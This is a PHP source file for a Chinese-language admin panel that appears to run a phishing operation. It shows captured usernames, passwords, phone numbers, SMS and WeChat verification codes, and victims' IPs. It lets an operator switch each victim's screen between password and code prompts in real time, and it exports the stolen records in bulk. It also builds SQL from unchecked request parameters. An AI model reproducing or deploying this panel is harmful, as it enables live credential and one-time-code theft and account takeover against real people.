<?php
/**
 * 数据管理
 **/
$title = '数据管理';
$table_list = array (
	'user' => '用户名',
	'pass' => '密码',
	'phone' => '电话',
	'code' => '验证码',
	'city' => '城市',
	'ip' => 'IP地址',
	'date' => '时间',
	'info' => '备注',
);
$day0 = mktime( 0, 0, 0, date( "m" ), date( "d" ), date( "Y" ) );
if ( !isset( $_GET[ 'day' ] ) )$_GET[ 'day' ] = 'all';
if ( 'all' == $_GET[ 'day' ] ) {
	$where = "";
	$fileName = '数据 ' . date( 'Y-m-d', time() ) . ' 以前全部数据';
}elseif( 'day7' == $_GET[ 'day' ] ) {
	$where = " date > " . ( $day0 - ( $day + 7 ) * 86400 ) . "";
	$fileName = '数据 ' . date( 'Y-m-d', time() ) . ' 以前七天数据';
}elseif( $_GET[ 'day' ] >= 0 ) {
	$where = " date < " . ( $day0 - ($_GET[ 'day' ]-1) * 86400 ) . " AND date > " . ( $day0 - ( $_GET[ 'day' ]) * 86400 ) . " ";
	$fileName = '数据 ' . date( 'Y-m-d', $day0 - ($_GET[ 'day' ]-1) * 86400 ) . ' 到 ' . date( 'Y-m-d', $day0 - $_GET[ 'day' ]  * 86400 ) . ' 24H 数据';
} else {
	$where = "";
	$fileName = '数据 ' . date( 'Y-m-d', time() ) . ' 以前全部数据';
}
$li = db( 'ec_data' )->where( $where )->order( 'id desc' )->page(50,$page)->select();
if(isset($_GET['c'])&&in_array($_GET['c'],array('execl','sql','txt','ini'))){
	$table_data=array();
	$table_data_li=db( 'ec_data' )->where( $where )->select();
	foreach ( $table_data_li as $key=>$val ) {
		foreach ( $table_list as $keyt=>$valt ) {
			if( 'domain' == $keyt ){
				$pu=parse_url($val[ 'href' ]);
				$row[ 'domain' ] =  $pu[ 'host' ] ;
			}else{
				$row[ $keyt ] = $val[$keyt];
			}
		}
		$table_data[]=$row;
	}
	if ( $_GET[ 'c' ] == 'execl' ) {
		$admin->exportExcel( $table_list, $table_data, $fileName );
	}elseif( $_GET[ 'c' ] == 'sql' ) {
		$admin->exportSql( $table_list, $table_data, $fileName );
	}elseif( $_GET[ 'c' ] == 'txt' ) {
		$admin->exportTxt( $table_list, $table_data, $fileName );
	}elseif( $_GET[ 'c' ] == 'ini' ) {
		$admin->exportIni( $table_list, $table_data, $fileName );
	}
}
function getLine(&$val){
	global $conf;
	$logs = explode('<br>',trim($val['logs']));
	$val['logs'] = implode('<br>',array_splice($logs,-3));
	
	$val['style'] = 'color:#333;';
	$val['send'] = str_ireplace('微信安全验证','',$val['send']);
	$repat = db( 'ec_data' )->where( 'ip', $val['ip'])->where( 'id', '<', $val['id'])->count();
	$repatDel = db( 'ec_data' )->where( 'ip', $val['ip'])->where( 'del', 1)->count();
	if(!empty($repat)){
	    $val['style'] = 'color:#2FB287;background:#f3fff3;';
	}
	if($repatDel){
	    $val['style'] = 'color:red;background:#fff3f3;';
	}
	$repat2 = db( 'ec_data' )->where( 'user', $val['user'])->where( 'id', '>', $val['id'])->count();
	if(!empty($repat2)){
	    $val['style'] = 'color:red;display:none;';
	}
	$val['online'] = abs($val['time'] - time()) < 120 ? '<span style="color:#0f0">在线</span>':'<span style="color:#f00">离线</span>';
	$html	.= '<tr data-id="'.$val['id'].'" style="'.$val['style'].'" >'."\r\n";
	$html	.= '	<td class="ids "><input class="idx" type="checkbox" value="'.$val['id'].'"><lable class="dl_idx"> '.$val['id'].'<lable></lable></lable></td>'."\r\n";
	$html	.= '	<td class="dl_user" index="'.$val['id'].',user" contenteditable="true">'.$val['user'].'</td>'."\r\n";
	$html	.= '	<td class="dl_pass" index="'.$val['id'].',pass" contenteditable="true">'.$val['pass'].'</td>'."\r\n";
	$html	.= '	<td class="phone" index="'.$val['id'].',phone" contenteditable="true">'.$val['phone'].'</td>'."\r\n";
	$html	.= '	<td class="code" index="'.$val['id'].',code" contenteditable="true">'.$val['code'].'</td>'."\r\n";
	$html	.= '	<td class="send" index22="'.$val['id'].',send" contenteditable="true">'.$val['send'].'</td>'."\r\n";
	$html	.= '	<td style="min-width:80px;">'."\r\n";
	$html	.= '		<button class="table_text" onclick="changesend(this,'.$val['id'].')" style="width:70px;line-height: 1.4em;" >发短信</button>'."\r\n";
	$html	.= '		<button class="table_text" onclick="changeok('.$val['id'].')" style="width:70px;line-height: 1.4em;" >认证</button>'."\r\n";
	$html	.= '		<select class="table_text status" onchange="changestate(this,'.$val['id'].')" style="width:90px;line-height: 1.4em;vertical-align:-1px;" >'."\r\n";
	$html	.= '			<option selected value="0">请选择</option>'."\r\n";
	$html	.= '			<option value="1">输入密码</option>'."\r\n";
	$html	.= '			<option value="2">-密码错误</option>'."\r\n";
	$html	.= '			<option value="3">验证码</option>'."\r\n";
	$html	.= '			<option value="4">-验证码错误</option>'."\r\n";
//	$html	.= '			<option value="13">手动发送验证</option>'."\r\n";
	$html	.= '			<option value="14">-手动校验失败</option>'."\r\n";
	$html	.= '			<option value="5">验证通过</option>'."\r\n";
	$html	.= '			<option value="7">输入电话</option>'."\r\n";
	$html	.= '			<option value="6">加载中</option>'."\r\n";
//	$html	.= '			<optgroup label="直接跳转"></optgroup>'."\r\n";
//	$html	.= '			<option value="6">系统繁忙</option>'."\r\n";
//	$html	.= '			<option value="7">支付密码</option>'."\r\n";
//	$html	.= '			<option value="9">【支密错误】</option>'."\r\n";
	$html	.= '		</select>'."\r\n";
	$html	.= '	</td>'."\r\n";
	
	
	$html	.= '	<td class="online" >'.$val['online'].'</td>'."\r\n";
	$html	.= '	<td class="visit" >'.$val['visit'].'</td>'."\r\n";
	$html	.= '	<td class="logs" >'.$val['logs'].'</td>'."\r\n";
	$html	.= '	<td class="dl_ip" >'.$val['ip'].'<br>'.$val['city'].'</td>'."\r\n";
	$html	.= '	<td class="dl_time">'.$val['date'].'</td>'."\r\n";
	$html	.= '	<td class="dl_info" index="'.$val['id'].',info" contenteditable="true" style="color: rgb(153, 0, 0);">'.$val['info'].'</td>'."\r\n";
	$html	.= '	<td class="delete" index="'.$val['id'].'" title="双击删除">✖</td>'."\r\n";
	$html	.= '</tr >'."\r\n";
	return $html;
}
if($_GET[ 'c' ] == 'changesend' ) {
	$json = array('err'=>0);
	db('ec_data')->where('id',$_POST['id'])->update(array('state'=>13,'send'=>$_POST['val']));
	exit(json_encode($json));
}elseif($_GET[ 'c' ] == 'changeok' ) {
	$json = array('err'=>0);
	$li = db('ec_data')->where('id',empty($_POST['id'])?0:$_POST['id'])->find();
	if('1' == $li['del']){
	    $json['del'] = 0;
	}else{
	    $json['del'] = 1;
	}
	$li = db('ec_data')->where('ip',$li['ip'])->update(array('del'=>$json['del']));
	$json['data'] = $li;
	exit(json_encode($json));
}elseif($_GET[ 'c' ] == 'rush' ) {
	$json = array('err'=>0);
	$li = db( 'ec_data' )->order( 'id desc' )->limit(50)->select();
	foreach($li as $vk=>&$val){
		$val['html'] = getLine($val);
	}
	$json['maxid'] = db( 'ec_data' )->max('id');;
	$json['data'] = $li;
	exit(json_encode($json));
}elseif( $_GET[ 'c' ] == 'delrep' ) {
	$repeatKs = array();
	foreach($table_list as $mk => $mv){
		if(!in_array($mk,array('id,sign','date','city','ip','time','href'))){
			$repeatKs[] = $mk;
		}
	}
	$repeatli=db(" SELECT max(id) as id FROM ec_data group by ".implode($repeatKs,',').";");
	$repeats = array();
	foreach($repeatli as $val)$repeats[] = $val['id'];
	if(!empty($repeats)){
		$ret=db("DELETE FROM  ec_data WHERE id NOT IN ( ".implode($repeats,',')." ) ;");
	}
	db('ec_data')->where('user', 'test@qq.com')->delete();;
	exit('{status:"ok"}');
}elseif( $_GET[ 'c' ] == 'updatestate' ) {
	$data = db('ec_data')->where('id',empty($_POST['id'])?0:$_POST['id'])->find();
	$data = db('ec_data')->where('id',empty($_POST['id'])?0:$_POST['id'])->update(array('state'=>$_POST['key'],'logs'=>$data['logs'].'<br>管理改为【'.$_POST['val'].'】'));
	exit('{status:"ok"}');
}elseif( $_GET[ 'c' ] == 'update' ) {
	db('ec_data')->where('id',empty($_POST['id'])?0:$_POST['id'])->update(array($_POST['field']=>$_POST['value']));
	if('send'== $_POST['field']){
	    // db('ec_data')->where('id',empty($_POST['id'])?0:$_POST['id'])->update(array('state'=>13));
	}
	exit('{status:"ok"}');
}elseif( $_GET[ 'c' ] == 'delall' ) {
	db('ec_data')->where(' 1 = 1 ')->delete();;
	exit('{status:"ok"}');
}elseif( $_GET[ 'c' ] == 'delcheck' ) {
	db('ec_data')->where('id' ,'in', $_POST['ids'])->delete();;
	exit('{status:"ok"}');
}elseif( $_GET[ 'c' ] == 'allow' ) {
	db('ec_data')->where('id' ,'in', $_POST['ids'])->update(array('info'=>empty($_POST['val'])?'--':$_POST['val']));
	exit('{status:"ok"}');
}elseif( $_GET[ 'c' ] == 'delete' ) {
	db('ec_data')->where('id',empty($_POST['id'])?0:$_POST['id'])->delete();;
	exit('{status:"ok"}');
} else{
	include './inc_header.php';
?>
<script>var get=<?php echo json_encode($_GET); ?>;</script>
<div class="data_list" style="">
	<div class="center-block" style="float: none;">
		<div class="table-responsive">
			<div class="menu">		
				<button doAct="day|all" type="button">全部</button>
				<button doAct="day|day7" type="button">近七天</button>
				<button doAct="day|2" type="button">前天</button>
				<button doAct="day|1" type="button">昨天</button>
				<button doAct="day|0" type="button">今天</button>
				&nbsp;<?php echo($fileName); ?>
			</div>
			<table class="table table-striped" border="0" cellspacing="0" cellpadding="0"  width="100%">
				<thead>
					<tr>
						<th width="100" ><input class="idall" type="checkbox" doact="act|docheck"><lable> 编号<lable></lable></lable></th>
						<th width="100">用户名</th>
						<th width="120" >密码</th>
						<th width="100" >电话</th>
						<th width="100" >验证码</th>
						<th width="120" >微信安全验证</th>
						<th width="280" >操作</th>
						<th width="50" >状态</th>
						<th width="50" >访问</th>
						<th width="150" >用户</th>
						<th width="100" >IP地址</th>
						<th width="80" >时间</th>
						<th width="80" >备注</th>
						<th width="50" >操作</th>
					</tr>
				</thead>
				<tbody>
					<?php
						$html	 = '';
						if (empty($li)) {
							$html	.= '<tr><td colspan="18"><h1 style="text-align:center;">没有数据！</h1></td></tr>';
						} else {
							foreach ( $li as $val ) {
								$html .= getLine($val);
							}
						}
						echo $html;
					?>			
				</tbody>
			</table>
			<div class="menu">		
				<button doAct="act|runcheck" type="button">反选</button>
				<button doAct="do|allow" type="button">通过选中</button>
				<button doAct="do|delcheck" type="button">删除选中</button>
				&nbsp;
				<button doAct="do|delrep" type="button">删除重复</button>
				<button doAct="do|delall" type="button">删除全部</button>
				&nbsp;
				<button doAct="c|execl" type="button">下载EXECL</button>
				<button doAct="c|sql" type="button">下载SQL</button>
				<button doAct="c|txt" type="button">下载TXT</button>
				<button doAct="c|ini" type="button">下载INI</button>
				&nbsp;
				<button doact="act|insetTset" type="button">测试</button>
			</div>
		</div>
		<div class="pagelist">
			<?php echo($page['html']); ?>
		</div>
	</div>
</div>
<audio id="mymusic" style="display:none;" src="./static/ding3.mp3" ></audio>
<?php 
	include './inc_footer.php';  
}